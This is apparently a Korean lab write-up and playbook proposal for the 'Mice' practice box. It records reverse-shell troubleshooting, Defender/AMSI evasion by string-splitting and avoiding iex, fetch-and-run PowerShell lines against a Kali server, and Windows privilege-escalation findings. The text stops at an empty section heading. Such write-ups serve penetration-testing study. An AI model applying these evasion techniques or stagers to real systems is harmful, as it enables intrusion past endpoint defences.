---
tags:
  - type/audit
  - platform/pg
manual_tags: true
manual_cves: true
---

# Mice — `_PLAYBOOK` 이관 제안 (2026-08-26)

작성: `pg-note-forge`. **`_PLAYBOOK.md` 는 열지 않았고 쓰지도 않았다.** 반영은 단독 기록자 몫.

원본 백업: `03. PG\_backup\Mice.md.bak` (489행 판, 개작 직전).
번호가 비어 있는 항목은 **신규**이고 번호는 배정하지 않았다(워커 번호 충돌 → 앵커 파손 방지).

⚠️ 이관 대상은 옛 노트의 **0장(배우는 것) · 6장(막혔던 지점/시행착오) · 7장(OSCP 시험 관점)** 전량이다.
8장(방어 관점)은 `_PLAYBOOK` 이 아니라 노트의 `Vulnerability Fix:` 두 곳으로 분산했다(이 파일 §4).

---

## 1. `A. 증상별`

### A-1 · 리버스셸 스테이저가 조용하다 — 포트를 바꿔 찍지 말고 타겟에서 한 번에 재라

- **절**: 신규. ⚠️ 「리버스셸이 안 붙는다」 계열 절이 이미 있으면 **그 밑에 병합**할 것.
- **넣을 본문**:

> **증상** — 시작 메뉴 주입·크론·웹셸처럼 **출력이 돌아올 콘솔이 없는** 경로로 스테이저를 던졌는데 리스너가 조용함. 무엇이 실패했는지(egress 차단 / AV 차단 / 페이로드 문법)를 구분할 신호가 없음.
>
> **하지 말 것** — 포트를 바꿔가며 리스너를 하나씩 찍는 것. 실패가 어느 계층인지 못 가림. Mice 가 실제로 먼저 한 것이 이것이었음 — `shell53.log` 22:28:34 · `shell4444.log` 22:28:39 · `shell8080.log` 22:28:46, 셋 다 `listening on [any] <포트> ...` 한 줄로 끝났고 아무것도 판정되지 않음.
>
> **할 것** — 타겟에서 여러 포트로 아웃바운드를 시도하고 **결과를 Kali HTTP 서버의 URL 경로로 회신**시킴. 404 여도 상관없음 — 요청이 도착했다는 사실만 필요함. 덤으로 Defender 실시간 보호 상태 같은 것도 같은 요청에 실어 받을 수 있음. Mice 실측(`~/PG/Mice/http.log` 22:29:35~38):
>
> ```text
> 192.168.248.199 - - [20/Aug/2026 22:29:35] "GET /who_divine_REMOTE-PC HTTP/1.1" 404 -
> 192.168.248.199 - - [20/Aug/2026 22:29:35] "GET /OPEN_443 HTTP/1.1" 404 -
> 192.168.248.199 - - [20/Aug/2026 22:29:35] "GET /BLOCK_53 HTTP/1.1" 404 -
> 192.168.248.199 - - [20/Aug/2026 22:29:36] "GET /OPEN_80 HTTP/1.1" 404 -
> 192.168.248.199 - - [20/Aug/2026 22:29:36] "GET /BLOCK_4444 HTTP/1.1" 404 -
> 192.168.248.199 - - [20/Aug/2026 22:29:37] "GET /BLOCK_8080 HTTP/1.1" 404 -
> 192.168.248.199 - - [20/Aug/2026 22:29:38] "GET /RTP_True HTTP/1.1" 404 -
> ```
>
> **그 다음 판정** — egress 가 열려 있는데도 콜백이 없으면 남은 후보는 **AV/AMSI 와 페이로드 문법**임. Mice 는 443·80 이 열려 있었는데 평문 `System.Net.Sockets.TCPClient` 원라이너가 조용했고, 문자열을 쪼개고 `iex` 를 없앤 판(`$TC='System.Net.Sockets.TCP'+'Client'` / `& ([scriptblock]::Create($d))`)으로 교체하자 같은 포트로 즉시 붙음(`www/a.revshell443` 22:28 → `www/a` 22:32:24 → 콜백 `shell443.log:2`).
> `[가정]` 평문판이 막힌 원인이 AV 라는 것은 **정황 추론**임. 차단 메시지를 직접 보지 못했음 — 시작 메뉴 주입은 출력이 돌아올 콘솔이 없기 때문. 정황 셋: (1) 온타겟 프로브가 `RTP_True`(실시간 보호 켜짐)를 보고했고, (2) 평문판은 443 이 열려 있는데도 콜백이 없었으며(`shell4444/53/8080.log` 는 물론 443 도 조용했음), (3) 분할판으로 교체하자 같은 포트로 즉시 붙음. 재부팅 뒤 평문판(`r.ps1`)을 두 번 더 던졌을 때도 콜백이 없었던 것(`rce_retry.log`)이 같은 방향.
>
> **주입 4회를 태웠다 — mtime 으로 복원한 순서.** `attempt1_type.log` 22:28:01(`powershell iex(irm .../a)`) → `attempt2_diag.log` 22:29:34(같은 문자열, 이때 `/a` 가 아웃바운드 프로브였음) → `attempt3_obf.log` 22:31:11(`-nop -w hidden` 추가) → 여기까지 `/a` 는 **아직 평문판**이었음(`www/a` 교체가 22:32:24). 즉 **`-nop -w hidden` 을 붙인 3회차도 실패했고, 바뀐 것은 주입 문자열이 아니라 서버에 올려둔 페이로드였음.** 22:33:06·22:34:14 의 `/a` 요청이 분할판을 받았고 22:34:58 에 셸이 살아 있었음(`proof_user.txt`).
> **반사** — 스테이저가 조용할 때 **주입 문자열만 만지작거리지 말 것.** 바꿔야 하는 쪽은 대개 서버에 올려둔 페이로드다.
>
> **스테이저는 짧게** — 키입력 주입은 문자당 지연이 있음(`mice_type.py` 기본 0.4초). 명령이 길수록 그대로 손해.

- **지우기 전 원문** (옛 노트 3장 · 6장):

> ### 어느 포트가 나가는지부터 재봤다
>
> 리버스셸이 안 붙자 포트를 바꿔가며 찍는 대신, **타겟에서 직접 아웃바운드를 프로브**해 결과를 Kali HTTP 서버의 URL 경로로 보고하게 했다. 결과는 웹 로그에 그대로 남는다:
>
> ```
> 192.168.248.199 - - [20/Aug/2026 22:29:35] "GET /who_divine_REMOTE-PC HTTP/1.1" 404 -
> 192.168.248.199 - - [20/Aug/2026 22:29:35] "GET /OPEN_443 HTTP/1.1" 404 -
> 192.168.248.199 - - [20/Aug/2026 22:29:35] "GET /BLOCK_53 HTTP/1.1" 404 -
> 192.168.248.199 - - [20/Aug/2026 22:29:36] "GET /OPEN_80 HTTP/1.1" 404 -
> 192.168.248.199 - - [20/Aug/2026 22:29:36] "GET /BLOCK_4444 HTTP/1.1" 404 -
> 192.168.248.199 - - [20/Aug/2026 22:29:37] "GET /BLOCK_8080 HTTP/1.1" 404 -
> 192.168.248.199 - - [20/Aug/2026 22:29:38] "GET /RTP_True HTTP/1.1" 404 -
> ```
>
> **443·80 은 나가고 53·4444·8080 은 막혀 있다.** `RTP_True` 는 Defender 실시간 보호가 켜져 있다는 뜻이고, 이게 다음 단계의 복선이 된다.
>
> 셸이 안 붙는 이유를 추측으로 좁히지 말고 이렇게 **한 번에 전부 재는 것**이 시험장에서 훨씬 싸다. 404 여도 상관없다 — 요청이 도착했다는 사실만 필요하다.

> `/a` 가 리버스셸이다. **⚠️ 페이로드는 반드시 난독화하라** — 처음 올린 `/a` 는 평문 `System.Net.Sockets.TCPClient` 였고 셸이 오지 않았다. 문자열을 쪼갠 판으로 바꾼 뒤(`22:32`) 바로 붙었다

> 플래그 하나씩 짚으면 — `-nop` 은 프로필 로딩을 건너뛰어 시작을 빠르게 하고(시작 메뉴 타이핑은 문자당 0.4초라 명령이 길수록 손해다), `-w hidden` 은 창을 숨겨 화면에 PowerShell 창이 뜨는 것을 막는다. 화면이 그대로 노출되는 GUI 주입에서는 이게 실용적인 차이다.
>
> `iex` 대신 `& ([scriptblock]::Create($d))` 를 쓴 것도 의도적이다. `iex` 는 AMSI 가 가장 먼저 보는 이름이라 그 자체로 시그니처를 끈다.

> `[가정]` **평문 리버스셸이 안 붙은 것도 같은 원인으로 본다.** 이쪽은 차단 메시지를 직접 보지 못했다 — 시작 메뉴 주입은 출력이 돌아올 콘솔이 없기 때문이다. 근거는 정황 셋이다: (1) 온타겟 프로브가 `RTP_True`(실시간 보호 켜짐)를 보고했고, (2) 평문 `System.Net.Sockets.TCPClient` 판은 443 이 열려 있는데도 콜백이 없었으며(`shell4444/53/8080.log` 는 물론 443 도 조용했다), (3) 문자열을 쪼갠 판으로 교체하자 같은 포트로 즉시 붙었다. 재부팅 뒤 다시 평문판(`r.ps1`)을 두 번 던졌을 때도 콜백이 없었던 것(`rce_retry.log`)이 같은 방향이다.

---

### A-41 · 셸은 잡았는데 권한상승 실마리가 없다 — **병합**

- **절**: **A-41. 셸은 잡았는데 권한상승 실마리가 없다** (기존, [[Robust]] 가 링크 중). 그 밑에 append.
- **넣을 본문**:

> **Mice(Windows) 소거 실측** — `harvest.ps1` 로 divine(Medium IL) 권한에서 훑은 결과, 표준 벡터가 전부 닫혀 있었음. 토큰 특권에 `SeImpersonatePrivilege` 없음(Potato 계열 불가) · 로컬 admin 그룹 멤버는 `Administrator` 단독 · `AlwaysInstallElevated` 양쪽 하이브 모두 키 없음 · SeriousSAM 은 `C:\Windows\System32\config\SAM: Access is denied.` · 쓰기 가능한 서비스 바이너리 없음 · 비-MS 예약작업은 OneDrive 뿐 · 저장된 자격증명은 `LegacyGeneric:target=XboxLive` 하나 · PowerShell 히스토리 없음.
> **여기서 「설정 파일 자격증명」으로 방향을 튼 것이 옳았음.** 표준 벡터가 전부 막히면 다음 순서는 FileZilla · PuTTY · WinSCP · `unattend.xml` · PowerShell 히스토리임. Mice 는 `%APPDATA%\FileZilla\recentservers.xml` 의 base64 암호였음.
> **덧붙여 — 이미 설치된 서드파티 GUI 앱 자체가 벡터일 수 있음.** Mice 는 진입에 쓴 Remote Mouse 가 권한상승 취약점도 같이 갖고 있었음(CVE-2022-3365 → CVE-2021-35448). 「진입에 쓴 소프트웨어」를 권한상승 후보에서 빼지 말 것.

- **지우기 전 원문** (옛 노트 6장):

> **표준 Windows 권한상승 벡터가 전부 막혀 있었다.** 서비스 바이너리와 그 상위 디렉터리 `icacls`, 예약작업, Run 키, `AlwaysInstallElevated`, 저장된 자격증명(`cmdkey`), SeriousSAM 까지 훑었으나 divine 이 건드릴 수 있는 것이 없었다. **여기서 "설정 파일 자격증명"으로 방향을 튼 것이 옳았다.**

---

### A-2 · AMSI 가 열거 스크립트를 통째로 막는다 — `ParserError` 면 안쪽을 고쳐도 소용없다

- **절**: 신규. AMSI/Defender 계열 절이 이미 있으면 그 밑에 병합.
- **넣을 본문**:

> **증상** — PowerShell 열거 스크립트(PrivescCheck·PowerUp 류)를 `iex(irm ...)` 로 올리면 그 자리에서 차단됨:
>
> ```powershell
> PS C:\WINDOWS\system32> iex : At line:1 char:1
> + #Requires -Version 2
> + ~~~~~~~~~~~~~~~~~~~~
> This script contains malicious content and has been blocked by your antivirus software.
> At line:1 char:1
> + iex(irm http://192.168.45.207/pc.ps1)
> + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
>     + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
>     + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
> ```
> — 출처: `~/PG/Mice/shell443.log:941-949`
>
> **읽는 법** — 분류가 `ParserError` 임. **AMSI 는 스크립트를 파싱하기도 전에 통째로 막는다.** 따라서 「스크립트 안쪽 어디가 걸렸나」를 찾는 것은 의미가 없음.
>
> **함정 — 「전달 경로만 바꾸기」는 통하지 않는다.** Mice 는 인라인 `iex` 를 `rpc.ps1`(`iex(irm .../pc.ps1)` 을 담은 별도 스크립트)로 감싸 던졌는데 **같은 곳에서 같은 메시지로 막힘**. 판정 대상은 전달 방식이 아니라 **내용**임. 결과적으로 `Invoke-PrivescCheck` 은 끝내 로드되지 않았고(`CommandNotFoundException` — `shell443.log:952-959`), 그 출력을 읽으려던 후속 스크립트 3개(`get.ps1`·`g2.ps1`·`g3.ps1`)가 전부 존재하지 않는 `pc.out` 을 읽는 헛수고가 됨.
>
> **대안** — 대형 프레임워크 대신 **순수 cmdlet 을 묶은 자작 스크립트**로 감. Mice 는 `harvest.ps1`(16개 섹션)이 차단 없이 완주함. 시그니처가 있는 공개 도구를 고집하는 것보다 싸다.

- **지우기 전 원문** (옛 노트 6장):

> **Defender AMSI 가 열거 스크립트를 차단했다.** PrivescCheck 를 올리자 그 자리에서:
>
> ```
> PS C:\WINDOWS\system32> iex : At line:1 char:1
> + #Requires -Version 2
> + ~~~~~~~~~~~~~~~~~~~~
> This script contains malicious content and has been blocked by your antivirus software.
> At line:1 char:1
> + iex(irm http://192.168.45.207/pc.ps1)
> + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
>     + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
> ```
>
> 주목할 점은 **`ParserError` 라는 것**이다. AMSI 는 스크립트를 파싱하기도 전에 통째로 막는다. 그래서 "스크립트 안쪽 어디가 걸렸나"를 찾는 건 의미가 없고, 전송 형태 자체를 바꿔야 한다.

⚠️ 원문의 마지막 문장 「**전송 형태 자체를 바꿔야 한다**」는 **이 박스에서 반증됐다** — 전송 형태를 바꾼 `rpc.ps1` 이 같은 메시지로 막혔다(`~/PG/Mice/www/rpc.ps1` · `shell443.log:944-960`). 위 새 본문은 그 반증을 반영한 것이다.

---

### A-3 · RDP 로 붙었는데 트레이 아이콘이 없다 — 세션 토폴로지부터 재라

- **절**: 신규.
- **넣을 본문**:

> **증상** — GUI 조작이 필요한 권한상승인데, RDP 로 붙은 화면의 알림 영역에 대상 앱 아이콘이 없음. 오버플로우 영역도 비어 있고 Alt-Tab 에도 창이 없음.
>
> **먼저 잴 것 — `query session` / `query user`.**
>
> ```text
>  SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE 
>  services                                    0  Disc                        
> >rdp-tcp#16        divine                    1  Active                      
>  console                                     3  Conn                        
>  rdp-tcp                                 65536  Listen                      
> ---
>  USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
> >divine                rdp-tcp#16          1  Active          1  7/16/2026 4:24 PM
> ```
> — 출처: `~/PG/Mice/shell443.log:7803-7811`
>
> **읽는 법** — 로그온 시각이 내 접속 시각보다 훨씬 앞이면(여기서는 7/16), 내가 만든 세션이 아니라 **원래 콘솔에 자동 로그인돼 있던 세션에 RDP 가 재접속(reconnect)해 들어간 것**임. 증거는 `SESSIONNAME` 이 `console` 에서 `rdp-tcp#N` 으로 바뀐 것이고, 남은 `console`(ID 3)은 사용자 없이 `Conn` 으로 비어 있음.
>
> **그러므로 세션이 갈려서 안 보이는 것이 아니다.** Mice 에서 `RemoteMouse.exe`(PID 2640)·`RemoteMouseCore.exe`(PID 2632)도 **같은 세션 1** 에 있었음. 같은 세션인데 알림 영역이 아이콘을 다시 그려주지 않은 것.
> `[가정]` 세션을 콘솔에서 RDP 로 리다이렉트할 때 이미 등록돼 있던(그것도 상위 무결성으로 도는) 프로세스의 트레이 아이콘이 재생성되지 않는 경우가 있음 — **이 렌더링 실패의 정확한 메커니즘은 확인하지 못했음.**
>
> **직접 띄우는 우회로도 막힐 수 있다.** 대상 exe 가 `requireAdministrator` 매니페스트면 일반 사용자가 실행할 때 UAC 가 관리자 암호를 요구함.
>
> **해결 — 리부트로 세션 재생성.** `shutdown /r`. 자동 로그인이 있으면 부팅 후 콘솔 세션이 새로 생기고 서비스가 GUI 를 새로 띄우며, 그 시점에 RDP 로 붙으면 아이콘이 처음부터 그려진 세션을 받음. `whoami /priv` 에 `SeShutdownPrivilege` 가 `Disabled` 로 보여도 됨 — **`Disabled` 는 「없다」가 아니라 「아직 활성화 안 됐다」**이고 `shutdown` 이 알아서 활성화함.
> 검증은 키입력 주입으로 함 — 주입한 `TESTREBOOT` 가 RDP 화면의 Edge 주소창(`bing.com/search?q=TESTREBOOT`)에 그대로 나타났고 트레이에 아이콘도 있었음.
>
> ⛔ **함부로 `logoff` 하지 마라.** Mice 는 아이콘 재생성을 노리고 `logoff` 를 먼저 썼고, 그 대가로 nc 리버스셸을 같이 잃었다. 세션을 끊는 조치는 **그 세션 위에 얹힌 셸을 전부 죽인다.** 리부트도 같은 대가를 치르므로, 하기 전에 **플래그·산출물을 먼저 회수**할 것.

- **지우기 전 원문** (옛 노트 6장, 전문):

> **가장 오래 막힌 곳 — Remote Mouse 트레이 아이콘이 RDP 화면에 없었다.** 먼저 세션 토폴로지부터 재봤다:
>
> ```
>  SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>  services                                    0  Disc
> >rdp-tcp#16        divine                    1  Active
>  console                                     3  Conn
>  rdp-tcp                                 65536  Listen
> ---
>  USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
> >divine                rdp-tcp#16          1  Active          1  7/16/2026 4:24 PM
> ```
>
> 읽는 법이 중요하다. divine 의 세션은 **ID 1** 이고, 로그온 시각이 `7/16/2026 4:24 PM` — 내가 만든 세션이 아니라 **원래 콘솔에 자동 로그인돼 있던 세션에 RDP 가 재접속(reconnect)해 들어간 것**이다. 그 증거가 `SESSIONNAME` 이 `console` 에서 `rdp-tcp#16` 으로 바뀐 것이고, 남은 `console`(ID 3)은 사용자 없이 `Conn` 상태로 비어 있다.
>
> 그리고 `RemoteMouse.exe`(PID 2640)·`RemoteMouseCore.exe`(PID 2632)도 **같은 세션 1** 에 있었다. 즉 **세션이 갈려서 아이콘이 안 보인 게 아니다** — 같은 세션인데 알림 영역이 아이콘을 다시 그려주지 않았다. 세션을 콘솔에서 RDP 로 리다이렉트할 때, 이미 등록돼 있던(그것도 상위 무결성으로 도는) 프로세스의 트레이 아이콘은 재생성되지 않는 경우가 있다. 오버플로우 영역도 비어 있었고 Alt-Tab 에도 창이 없었다. `[가정]` — 이 렌더링 실패의 정확한 메커니즘까지는 확인하지 못했다.
>
> 직접 띄우는 우회로도 막혀 있었다. `RemoteMouse.exe` 는 `requireAdministrator` 매니페스트라 divine 이 실행하면 UAC 가 관리자 암호를 요구한다:
>
> ```
> PS C:\WINDOWS\system32> Start-Process : This command cannot be run due to the
> error: The operation was canceled by the user.
> + Start-Process "C:\Program Files (x86)\Remote Mouse\RemoteMouse.exe"; ...
> ```
>
> `The operation was canceled by the user` 는 내가 취소한 게 아니라 **응답할 대상이 없는 UAC 프롬프트가 자동으로 거절된 것**이다. 헤드리스에서 UAC 를 만나면 이 문구가 나온다고 기억해 두면 오독을 아낀다.
>
> **해결 — 리부트로 세션 재생성.** `shutdown /r` 로 재부팅했다(divine 은 `SeShutdownPrivilege` 를 갖고 있다 — `whoami /priv` 에 `Disabled` 로 나오지만 Disabled 는 "없다"가 아니라 "아직 활성화 안 됐다"이고, `shutdown` 이 알아서 활성화한다). 부팅 후 자동 로그인이 divine 을 콘솔에 앉히고 서비스가 GUI 를 새로 띄우며, 그 시점에 RDP 로 붙으면 아이콘이 처음부터 그려진 세션을 받는다. 검증은 키입력 주입으로 했다 — 주입한 `TESTREBOOT` 가 내 RDP 화면의 Edge 주소창(`bing.com/search?q=TESTREBOOT`)에 그대로 나타났고, 트레이에 Remote Mouse 아이콘도 있었다.
>
> 앞서 `logoff` 로 세션을 끝낸 것이 사태를 더 꼬았다. **함부로 logoff 하지 마라** — 이 박스에서는 그 대가로 nc 리버스셸도 같이 잃었다.

---

### A-4 · 헤드리스에서 `The operation was canceled by the user` — 내가 취소한 게 아니다

- **절**: 신규(A-3 에 흡수해도 무방 — 단독 절로 두면 문구 검색으로 바로 걸린다).
- **넣을 본문**:

> **증상** — 헤드리스(SSH·리버스셸)에서 `Start-Process` 로 exe 를 띄우면:
>
> ```powershell
> PS C:\WINDOWS\system32> Start-Process : This command cannot be run due to the 
> error: The operation was canceled by the user.
> ```
> — 출처: `~/PG/Mice/shell443.log:7813-7823`
>
> **읽는 법** — 사용자가 취소한 것이 아니라 **응답할 대상이 없는 UAC 프롬프트가 자동으로 거절된 것**임. 대상 exe 가 `requireAdministrator` 매니페스트라는 신호. 이 문구를 「내 명령이 틀렸다」로 읽으면 시간을 태움.
> **다음 수** — GUI 세션(RDP·VNC)을 확보하거나, UAC 를 우회하는 별도 경로를 찾음.

- **지우기 전 원문**: 위 A-3 원문 블록에 포함(`Start-Process` 문단).

---

### A-5 · unquoted service path 를 봤는데 성립하지 않는다 — 재야 할 것은 공백이 아니라 `icacls` 의 `(AD)`·`(IO)`

- **절**: 신규.
- **넣을 본문**:

> **증상** — `sc qc` / 서비스 목록에 따옴표 없는 공백 경로가 보임. 반사적으로 하이재킹을 시도하게 됨.
>
> ```text
> RemoteMouseService   LocalSystem   Running   Auto   C:\Program Files (x86)\Remote Mouse\RemoteMouseService.exe
> ```
>
> 공백에서 끊기는 후보는 `C:\Program.exe` → `C:\Program Files.exe` → `C:\Program Files (x86)\Remote.exe` 순이고, **가장 먼저 시도되는 것은 `C:\Program.exe`, 즉 C 드라이브 루트**임.
>
> **판정은 `icacls` 로 끝난다.**
>
> ```text
> C:\ BUILTIN\Administrators:(OI)(CI)(F)
>     NT AUTHORITY\SYSTEM:(OI)(CI)(F)
>     BUILTIN\Users:(OI)(CI)(RX)
>     NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
>     NT AUTHORITY\Authenticated Users:(AD)
>     Mandatory Label\High Mandatory Level:(OI)(NP)(IO)(NW)
> ```
> — 출처: `~/PG/Mice/shell443.log:893-899`
>
> `Authenticated Users` 의 `(M)` 에 **`(IO)` = Inherit Only** 가 붙어 있음. 상속으로 만들어질 하위 개체에만 적용되고 `C:\` 자체에는 적용되지 않음. `C:\` 에 직접 걸린 것은 `(AD)` = **디렉터리 생성만** 허용. 그래서 `C:\Program.exe` 라는 **파일**은 만들 수 없음. Windows 기본 설치의 표준 방어이고, unquoted service path 가 실무에서 대개 안 통하는 이유가 이것임.
>
> **반사** — 경로에 공백이 있다는 사실이 아니라 **끊기는 지점의 디렉터리에 파일을 만들 수 있는가**를 잼. `C:\` 루트가 후보라면 `icacls C:\` 로 `(AD)` 와 `(IO)` 를 먼저 확인할 것. `(AD)` 만 있으면 폴더는 만들어져도 exe 는 못 놓음.
>
> ⚠️ **자작 열거 스크립트의 오탐 주의.** `~/PG/Mice/harvest_divine.txt` 의 `UNQUOTED SERVICE PATHS` 절은 필터가 잘못 잡혀 **`svchost.exe -k ...` 형태를 전부 「unquoted」로 나열**함(`AJRouter`·`AppIDSvc`·`Appinfo` …). 목록 길이를 성과로 읽지 말 것.

- **지우기 전 원문** (옛 노트 6장):

> **EDB 50258(unquoted service path)은 이 박스에서 성립하지 않았다.** `RemoteMouseService` 의 경로가 따옴표 없이 등록돼 있는 것은 사실이다:
>
> ```
> RemoteMouseService   LocalSystem   Running   Auto   C:\Program Files (x86)\Remote Mouse\RemoteMouseService.exe
> ```
>
> 공백에서 끊기는 후보는 `C:\Program.exe` → `C:\Program Files.exe` → `C:\Program Files (x86)\Remote.exe` 순이고, **가장 먼저 시도되는 것은 `C:\Program.exe`, 즉 C 드라이브 루트다.** 거기 ACL 을 재보면 끝난다:
>
> ```
> C:\ BUILTIN\Administrators:(OI)(CI)(F)
>     NT AUTHORITY\SYSTEM:(OI)(CI)(F)
>     BUILTIN\Users:(OI)(CI)(RX)
>     NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
>     NT AUTHORITY\Authenticated Users:(AD)
>     Mandatory Label\High Mandatory Level:(OI)(NP)(IO)(NW)
> ```
>
> `Authenticated Users` 의 `(M)` 에 **`(IO)` = Inherit Only** 가 붙어 있다. 상속으로 만들어질 하위 개체에만 적용되고 `C:\` 자체에는 적용되지 않는다. `C:\` 에 직접 걸린 것은 `(AD)` = **디렉터리 생성만** 허용이다. 그래서 `C:\Program.exe` 라는 **파일**은 만들 수 없다. Windows 기본 설치의 표준 방어이고, unquoted service path 가 실무에서 대개 안 통하는 이유가 이것이다.
>
> > [!tip] unquoted service path 를 봤을 때 재야 할 것
> > 경로에 공백이 있다는 사실이 아니라 **끊기는 지점의 디렉터리에 파일을 만들 수 있는가**다. `C:\` 루트가 후보라면 `icacls C:\` 로 `(AD)` 와 `(IO)` 를 먼저 확인하라. `(AD)` 만 있으면 폴더는 만들어져도 exe 는 못 놓는다.
> >
> > 참고로 `~/PG/Mice/harvest_divine.txt` 의 `UNQUOTED SERVICE PATHS` 절은 필터가 잘못 잡혀 **`svchost.exe -k ...` 형태를 전부 "unquoted" 로 나열**한다. 자작 열거 스크립트의 오탐이 이렇게 생긴다는 예시로 남겨둔다.

---

### A-6 · 디스크에 남은 PowerShell transcript 가 관리자 스크립트를 가리킨다 — 재실행 지점부터 확인하라

- **절**: 신규.
- **넣을 본문**:

> **증상** — 열거 중 이런 transcript 헤더가 나옴:
>
> ```powershell
> Windows PowerShell transcript start
> Start time: 20260820061010
> Username: REMOTE-PC\Administrator
> RunAs User: REMOTE-PC\Administrator
> Configuration Name: 
> Machine: REMOTE-PC (Microsoft Windows NT 10.0.19042.0)
> Host Application: C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy bypass -WindowStyle Hidden -NoProfile -Command C:\freezeScript\win10.ps1
> ```
> — 출처: `~/PG/Mice/shell443.log:288-294`
>
> **Administrator 가, `-ExecutionPolicy bypass` 로, 이 인스턴스가 켜진 날 06:10:10 에** 돌린 것. 여기까지만 보면 완벽한 하이재킹 대상.
>
> **그러나 두 가지를 먼저 재라.** ① 스크립트 파일이 아직 있는가 ② 재실행 트리거가 사용자 손이 닿는 곳에 있는가.
> Mice 는 `dir C:\freezeScript` 가 `File Not Found` — 스크립트가 자기 자신을 지우고 끝난 뒤였음(`shell443.log:380-401`). 트리거도 없었음(HKCU Run 은 OneDrive 뿐, 비-MS 예약작업도 OneDrive 뿐). **프로비저닝 잔재이고 재실행 지점이 없으므로 배제.**
>
> **일반화** — PG/HTB 박스의 `freezeScript`·`sysprep`·이미징 잔재는 「관리자가 돌린 흔적」일 뿐 벡터가 아닌 경우가 많음. **파일 존재 + 트리거 존재**가 둘 다 성립해야 벡터임.

- **지우기 전 원문** (옛 노트 6장):

> **`C:\freezeScript\win10.ps1` 도 벡터가 아니었다.** 디스크에 남은 PowerShell transcript 헤더에서 이런 게 나왔다:
>
> ```
> Windows PowerShell transcript start
> Start time: 20260820061010
> Username: REMOTE-PC\Administrator
> RunAs User: REMOTE-PC\Administrator
> Host Application: C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy bypass -WindowStyle Hidden -NoProfile -Command C:\freezeScript\win10.ps1
> ```
>
> **Administrator 가, `-ExecutionPolicy bypass` 로, 이 인스턴스가 켜진 날 06:10:10 에** 돌렸다. 여기까지만 보면 완벽한 하이재킹 대상이다. 그런데 `dir C:\freezeScript` 는 `The system cannot find the file specified` — 스크립트가 자기 자신을 지우고 끝난 뒤다. 트리거도 사용자가 손댈 수 있는 곳에 없었다(HKCU Run 은 OneDrive 뿐, 비-MS 예약작업도 OneDrive 뿐). **프로비저닝 잔재이고 재실행 지점이 없으므로 배제.**

---

### A-7 · 파일 대화상자에서 exe 를 실행하려는데 「저장」으로 처리된다

- **절**: 신규(B-b 기법 카드와 상호 링크).
- **넣을 본문**:

> **증상** — 상위 권한 앱이 띄운 「다른 이름으로 저장」 대화상자에서 `C:\Windows\System32\cmd.exe` 를 넣고 Enter 했는데 셸이 안 뜨고 저장 시도로 처리됨.
>
> **원인** — **「파일 이름」 칸에 넣었기 때문.** 그 칸은 저장 대상 파일명을 받음.
>
> **해결** — **주소창(브레드크럼)** 을 클릭해 편집 모드로 만든 뒤 경로를 넣음. 그러면 탐색기가 그것을 「이동할 위치」로 해석하고, 대상이 실행 파일이면 **실행**함.
> Mice 실측: `File name` 칸에는 `Save Here` 가 들어간 상태였고(`파일보관\PG-Mice-system-saveas-dialog.png`), 주소창으로 옮긴 뒤에야 `Administrator: C:\Windows\System32\cmd.exe` 창이 떴음.

- **지우기 전 원문** (옛 노트 6장):

> **파일 대화상자 — "파일 이름" 칸이 아니라 "주소창"이다.** 처음에 파일 이름 칸에 `cmd.exe` 경로를 넣고 Enter 하니 저장 시도로 처리됐다. **저장 대화상자에서 exe 를 실행하려면 주소창(브레드크럼)을 클릭해 편집 모드로 만든 뒤 경로를 넣어야** 탐색기가 그것을 "이동할 위치"로 해석하고, 대상이 실행 파일이면 실행한다.

---

### A-8 · 저권한 열거 결과의 빈칸을 「없음」으로 읽지 마라 — 6,692행 → 9,282행

- **절**: 신규.
- **넣을 본문**:

> **측정된 사실** — Mice 에서 **같은 `harvest.ps1` 을 divine(Medium IL)과 SYSTEM 으로 각각 돌렸음.** divine **6,692행** → SYSTEM **9,282행**, 차이 **2,590행**. 16개 열거 섹션을 전부 완주하고 `===== DONE =====` 마커까지 찍혔으니 스크립트가 중간에 죽어서 짧았던 것이 아님.
>
> **저권한에서는 서비스 DACL·다른 사용자 프로필·레지스트리 하이브·예약작업 상세가 조용히 잘려서 돌아온다** — 에러가 아니라 그냥 빈 줄로 옴. 그래서 「이 박스엔 아무것도 없다」의 근거로 저권한 열거 결과를 쓰면 안 됨.
>
> **반사** — 권한을 올렸으면 **같은 열거를 그 권한으로 다시 돌린다.** 「감」이 아니라 이 숫자다.

- **지우기 전 원문** (옛 노트 6장):

> ### 권한 레벨마다 열거를 다시 돌려라 — 측정된 사실
>
> SYSTEM cmd 를 잡은 뒤 **같은 `harvest.ps1` 을 그대로 다시 돌렸다.** 결과가 확연히 다르다:
>
> **divine 6,692행 → SYSTEM 9,282행, 차이 2,590행.** `harvest.ps1` 의 16개 열거 섹션을 전부 완주하고 `===== DONE =====` 마커까지 찍혔으니 스크립트가 중간에 죽어서 짧았던 게 아니다. 저권한에서는 서비스 DACL, 다른 사용자 프로필, 레지스트리 하이브, 예약작업 상세가 **조용히 잘려서** 돌아온다 — 에러가 아니라 그냥 빈 줄로 온다.
>
> "권한 레벨마다 한 번씩 돌려라"는 이제 감이 아니라 이 숫자다. 저권한 열거 결과를 "이 박스엔 아무것도 없다"의 근거로 쓰지 마라.

⚠️ 본문(측정 수치 + 스크린샷 + 명령 블록)은 **노트의 `Post-Exploitation` 에도 남겼다.** SYSTEM 획득 직후의 실측 기록이라 노트 쪽 근거로 필요하고, `_PLAYBOOK` 쪽은 「증상 → 반사」로 승격한 판이다. 중복이 아니라 역할 분리다.

---

### A-9 · 증거 회수 채널과 조작 채널이 다르면 증거가 화면에 갇힌다

- **절**: 신규. `D` 체크리스트 쪽이 더 맞다고 판단되면 그쪽으로.
- **넣을 본문**:

